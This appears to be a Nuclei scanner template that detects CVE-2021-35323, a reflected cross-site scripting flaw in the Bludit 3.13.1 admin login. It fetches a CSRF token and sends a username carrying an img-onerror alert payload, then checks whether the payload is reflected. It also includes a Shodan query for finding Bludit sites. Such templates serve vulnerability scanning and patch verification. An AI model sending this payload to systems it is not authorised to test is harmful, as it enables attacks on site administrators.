id: CVE-2021-35323

info:
  name: Bludit 3.13.1 - Cross Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Cross Site Scripting (XSS) vulnerability exists in bludit 3-13-1 via the username in admin/login
  remediation: Bludit v4.0.0
  reference:
    - https://github.com/bludit/bludit/issues/1327
    - https://nvd.nist.gov/vuln/detail/CVE-2021-35323
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-35323
    cwe-id: CWE-79
    epss-score: 0.00183
    epss-percentile: 0.55453
    cpe: cpe:2.3:a:bludit:bludit:3.13.1:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: bludit
    product: bludit
    shodan-query: title:"Bludit"
  tags: cve,cve2021,bludit,xss

http:
  - raw:
      - |
        GET /bludit/admin/login HTTP/1.1
        Host: {{Hostname}}
      - |
        @timeout: 10s
        POST /bludit/admin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        tokenCSRF={{tokenCSRF}}&username=admin%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E&password=pass&save=

    cookie-reuse: true
    host-redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "text/html")'
          - 'contains(body_2, "<img src=x onerror=alert(document.domain)>") && contains(body_2, "Bludit")'
        condition: and

    extractors:
      - type: regex
        name: tokenCSRF
        part: body
        group: 1
        regex:
          - 'type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*)"'
        internal: true

# digest: 4a0a00473045022100e18b961378d8b1d3f08f02ecf053cbe92f7c87e05799d085d49864fae2a865af022035ac8e12e60fd55e251ef8aa6e02c571903cbfcfcca95d2ad0b46d8dfd225f7d:922c64590222798bb761d5b6d8e72950
